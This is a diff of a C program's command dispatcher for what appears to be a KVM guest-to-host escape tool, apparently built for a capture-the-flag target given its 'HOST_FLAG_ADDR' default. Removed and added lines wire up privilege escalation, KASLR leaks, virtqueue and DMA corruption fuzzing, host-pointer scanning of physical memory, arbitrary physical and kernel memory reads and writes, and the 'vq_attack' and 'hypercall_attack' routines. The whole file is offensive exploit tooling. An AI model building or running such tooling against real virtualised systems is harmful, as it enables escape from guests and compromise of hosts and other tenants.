-            unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);
-            unsigned int size = (unsigned int)strtoul(argv[3], NULL, 0);
-            unsigned int value = (unsigned int)strtoul(argv[4], NULL, 0);
-            write_port(port, size, value);
-        }
-    }
-    
-    /* Symbol and info commands */
-    else if (strcmp(command, "lookup") == 0) {
-        if (argc < 3) {
-            printf("Usage: lookup <symbol_name>\n");
-        } else {
-            lookup_symbol(argv[2]);
-        }
-    }
-    else if (strcmp(command, "kernel_base") == 0) {
-        get_kernel_base();
-    }
-    else if (strcmp(command, "kaslr") == 0) {
-        get_kaslr_slide();
-    }
-    else if (strcmp(command, "current_task") == 0) {
-        get_current_task();
-    }
-    else if (strcmp(command, "escalate") == 0) {
-        escalate_privileges();
-    }
-    else if (strcmp(command, "status") == 0) {
-        check_status();
-    }
-    
-    /* Hypercall commands */
-    else if (strcmp(command, "trigger_hypercall") == 0) {
-        trigger_hypercall();
-    }
-    else if (strcmp(command, "hypercall") == 0) {
-        if (argc < 7) {
-            printf("Usage: hypercall <nr> <a0> <a1> <a2> <a3>\n");
-        } else {
-            unsigned long nr = strtoul(argv[2], NULL, 0);
-            unsigned long a0 = strtoul(argv[3], NULL, 0);
-            unsigned long a1 = strtoul(argv[4], NULL, 0);
-            unsigned long a2 = strtoul(argv[5], NULL, 0);
-            unsigned long a3 = strtoul(argv[6], NULL, 0);
-            hypercall_with_args(nr, a0, a1, a2, a3);
-        }
-    }
-    
-    /* Automation harnesses */
-    else if (strcmp(command, "vq_fuzz") == 0) {
-        if (argc < 5) {
-            printf("Usage: vq_fuzz <iters> <max_index> <mode> [trigger_every]\n");
-        } else {
-            int iters = atoi(argv[2]);
-            int max_index = atoi(argv[3]);
-            int mode = atoi(argv[4]);
-            int trigger_every = (argc > 5) ? atoi(argv[5]) : 100;
-            vq_fuzz(iters, max_index, mode, trigger_every);
-        }
-    }
-    else if (strcmp(command, "dma_probe") == 0) {
-        int pages = 8;
-        int pattern = 0;
-        int trigger = 1;
-        if (argc > 2) pages = atoi(argv[2]);
-        if (argc > 3) pattern = atoi(argv[3]);
-        if (argc > 4) trigger = atoi(argv[4]);
-        dma_probe(pages, pattern, trigger);
-    }
-    else if (strcmp(command, "msr_fuzz") == 0) {
-        if (argc < 4) {
-            printf("Usage: msr_fuzz <start> <end> <patterns_mask>\n");
-        } else {
-            unsigned int start = (unsigned int)strtoul(argv[2], NULL, 0);
-            unsigned int end = (unsigned int)strtoul(argv[3], NULL, 0);
-            unsigned int mask = (argc > 4) ? (unsigned int)strtoul(argv[4], NULL, 0) : 0xf;
-            msr_fuzz(start, end, mask);
-        }
-    }
-    else if (strcmp(command, "crash_monitor") == 0) {
-        if (argc < 3) {
-            printf("Usage: crash_monitor start|stop\n");
-        } else if (strcmp(argv[2], "start") == 0) {
-            start_crash_monitor();
-        } else if (strcmp(argv[2], "stop") == 0) {
-            stop_crash_monitor();
-        } else {
-            printf("Usage: crash_monitor start|stop\n");
-        }
-    }
-    else if (strcmp(command, "v2p_fast") == 0) {
-        if (argc < 3) {
-            printf("Usage: v2p_fast <phys> [start] [end] [step] [progress_every]\n");
-        } else {
-            unsigned long target = strtoul(argv[2], NULL, 0);
-            unsigned long start_va = 0xffff888000000000UL;
-            unsigned long end_va = 0xffffc87fffffffffUL;
-            unsigned long step = 0x1000;
-            unsigned long progress_every = 10000;
-            if (argc > 3) start_va = strtoul(argv[3], NULL, 0);
-            if (argc > 4) end_va = strtoul(argv[4], NULL, 0);
-            if (argc > 5) step = strtoul(argv[5], NULL, 0);
-            if (argc > 6) progress_every = strtoul(argv[6], NULL, 0);
-            virt_to_phys_scan_fast(target, start_va, end_va, step, progress_every);
-        }
-    }
-    
-    /* ADAPTIVE FUZZING COMMANDS */
-    else if (strcmp(command, "adaptive_vq_fuzz") == 0) {
-        if (argc < 3) {
-            printf("Usage: adaptive_vq_fuzz <max_iterations> [starting_corruption_%%]\n");
-            printf("  max_iterations: Total iterations across all phases\n");
-            printf("  starting_corruption: Initial corruption level 0-100 (default: 10)\n");
-            printf("\nExample: adaptive_vq_fuzz 1000 10\n");
-            printf("  Starts at 10%% corruption, increases by 10%% each phase\n");
-        } else {
-            int max_iter = atoi(argv[2]);
-            int corruption = (argc > 3) ? atoi(argv[3]) : 10;
-            adaptive_vq_leak_fuzz(max_iter, corruption);
-        }
-    }
-    else if (strcmp(command, "adaptive_dma_fuzz") == 0) {
-        if (argc < 3) {
-            printf("Usage: adaptive_dma_fuzz <pages> [starting_corruption_%%]\n");
-            printf("  pages: Number of DMA pages to allocate (1-16)\n");
-            printf("  starting_corruption: Initial corruption level 0-100 (default: 20)\n");
-            printf("\nExample: adaptive_dma_fuzz 8 20\n");
-        } else {
-            int pages = atoi(argv[2]);
-            int corruption = (argc > 3) ? atoi(argv[3]) : 20;
-            adaptive_dma_leak_fuzz(pages, corruption);
-        }
-    }
-    else if (strcmp(command, "progressive_scan") == 0) {
-        if (argc < 4) {
-            printf("Usage: progressive_scan <start_addr> <end_addr> [initial_step] [phases]\n");
-            printf("  start_addr: Starting physical address\n");
-            printf("  end_addr: Ending physical address\n");
-            printf("  initial_step: Initial scan step size (default: 0x10000)\n");
-            printf("  phases: Number of scan phases (default: 5)\n");
-            printf("\nExample: progressive_scan 0x1000000 0x2000000 0x10000 5\n");
-            printf("  Scans 16MB range, starting with 64KB steps, halving each phase\n");
+            printf("Usage: scan_phys <start> <end> [step]\n");
         } else {
             unsigned long start = strtoul(argv[2], NULL, 0);
             unsigned long end = strtoul(argv[3], NULL, 0);
             unsigned long step = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0x10000;
-            int phases = (argc > 5) ? atoi(argv[5]) : 5;
-            progressive_memory_scan(start, end, step, phases);
+            scan_physical_for_host_ptrs(start, end, step);
         }
     }
-    else if (strcmp(command, "show_leaks") == 0) {
-        show_leak_candidates();
+    else if (strcmp(cmd, "show_leaks") == 0) {
+        show_leaks();
     }
-    else if (strcmp(command, "reset_leaks") == 0) {
-        reset_leak_candidates();
-        printf("[+] Leak candidate list cleared\n");
+    
+    /* Attack vectors */
+    else if (strcmp(cmd, "vq_attack") == 0) {
+        unsigned long addr = HOST_FLAG_ADDR;
+        if (argc > 2) addr = strtoul(argv[2], NULL, 0);
+        virtqueue_host_memory_attack(addr);
     }
-    /* Unknown command */
+    else if (strcmp(cmd, "hypercall_attack") == 0) {
+        unsigned long addr = HOST_FLAG_ADDR;
+        if (argc > 2) addr = strtoul(argv[2], NULL, 0);
+        hypercall_exploitation(addr);
+    }
+    
+    /* Basic operations */
+    else if (strcmp(cmd, "read_phys") == 0) {
+        if (argc < 4) {
+            printf("Usage: read_phys <addr> <size>\n");
+        } else {
+            unsigned long addr = strtoul(argv[2], NULL, 0);
+            size_t size = strtoul(argv[3], NULL, 0);
+            unsigned char *buf = malloc(size);
+            if (buf && read_physical(addr, buf, size) == 0) {
+                hexdump(buf, addr, size);
+            }
+            free(buf);
+        }
+    }
+    else if (strcmp(cmd, "read_mmio") == 0) {
+        if (argc < 4) {
+            printf("Usage: read_mmio <addr> <size>\n");
+        } else {
+            unsigned long addr = strtoul(argv[2], NULL, 0);
+            size_t size = strtoul(argv[3], NULL, 0);
+            unsigned char *buf = malloc(size);
+            if (buf && read_mmio(addr, buf, size) == 0) {
+                hexdump(buf, addr, size);
+            }
+            free(buf);
+        }
+    }
+    else if (strcmp(cmd, "read_kernel") == 0) {
+        if (argc < 4) {
+            printf("Usage: read_kernel <addr> <size>\n");
+        } else {
+            unsigned long addr = strtoul(argv[2], NULL, 0);
+            size_t size = strtoul(argv[3], NULL, 0);
+            unsigned char *buf = malloc(size);
+            struct kvm_kernel_mem_read req = {
+                .kernel_addr = addr,
+                .length = size,
+                .user_buf = buf
+            };
+            if (buf && ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
+                hexdump(buf, addr, size);
+            }
+            free(buf);
+        }
+    }
+    else if (strcmp(cmd, "write_phys") == 0) {
+        if (argc < 4) {
+            printf("Usage: write_phys <addr> <hex_data>\n");
+        } else {
+            unsigned long addr = strtoul(argv[2], NULL, 0);
+            char *hex = argv[3];
+            size_t len = strlen(hex) / 2;
+            unsigned char *data = malloc(len);
+            for (size_t i = 0; i < len; i++) {
+                sscanf(hex + 2*i, "%2hhx", &data[i]);
+            }
+            if (write_physical(addr, data, len) == 0) {
+                printf("[+] Wrote %zu bytes to 0x%lx\n", len, addr);
+            }
+            free(data);
+        }
+    }
+    else if (strcmp(cmd, "hypercall") == 0) {
+        if (argc < 3) {
+            printf("Usage: hypercall <nr> [a0] [a1] [a2] [a3]\n");
+        } else {
+            unsigned long nr = strtoul(argv[2], NULL, 0);
+            unsigned long a0 = (argc > 3) ? strtoul(argv[3], NULL, 0) : 0;
+            unsigned long a1 = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0;
+            unsigned long a2 = (argc > 5) ? strtoul(argv[5], NULL, 0) : 0;
+            unsigned long a3 = (argc > 6) ? strtoul(argv[6], NULL, 0) : 0;
+            long ret = do_hypercall(nr, a0, a1, a2, a3);
+            printf("[+] Hypercall %lu returned: %ld (0x%lx)\n", nr, ret, (unsigned long)ret);
+        }
+    }
+    
+    /* Register operations */
+    else if (strcmp(cmd, "read_cr0") == 0) {
+        unsigned long cr0 = 0;
+        if (ioctl(fd, IOCTL_READ_CR0, &cr0) == 0) {
+            printf("[+] CR0 = 0x%lx\n", cr0);
+            printf("    PE=%lu PG=%lu WP=%lu\n", 
+                   cr0 & 1, (cr0 >> 31) & 1, (cr0 >> 16) & 1);
+        }
+    }
+    else if (strcmp(cmd, "read_cr4") == 0) {
+        unsigned long cr4 = 0;
+        if (ioctl(fd, IOCTL_READ_CR4, &cr4) == 0) {
+            printf("[+] CR4 = 0x%lx\n", cr4);
+            printf("    SMEP=%lu SMAP=%lu\n", (cr4 >> 20) & 1, (cr4 >> 21) & 1);
+        }
+    }
+    else if (strcmp(cmd, "read_efer") == 0) {
+        unsigned long long efer = 0;
+        if (ioctl(fd, IOCTL_READ_EFER, &efer) == 0) {
+            printf("[+] EFER = 0x%llx\n", efer);
+            printf("    SCE=%llu LME=%llu LMA=%llu NXE=%llu\n",
+                   efer & 1, (efer >> 8) & 1, (efer >> 10) & 1, (efer >> 11) & 1);
+        }
+    }
+    else if (strcmp(cmd, "read_msr") == 0) {
+        if (argc < 3) {
+            printf("Usage: read_msr <msr>\n");
+        } else {
+            struct msr_data req = {
+                .msr = (unsigned int)strtoul(argv[2], NULL, 0),
+                .value = 0
+            };
+            if (ioctl(fd, IOCTL_READ_MSR, &req) == 0) {
+                printf("[+] MSR 0x%x = 0x%llx\n", req.msr, req.value);
+            }
+        }
+    }
+    else if (strcmp(cmd, "kaslr") == 0) {
+        unsigned long slide = 0;
+        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) == 0) {
+            printf("[+] Guest KASLR slide: 0x%lx\n", slide);
+        }
+    }
     else {
-        printf("Unknown command: %s\n\n", command);
+        printf("Unknown command: %s\n", cmd);
         print_help();
         return 1;
     }
-
+    
     return 0;
 }
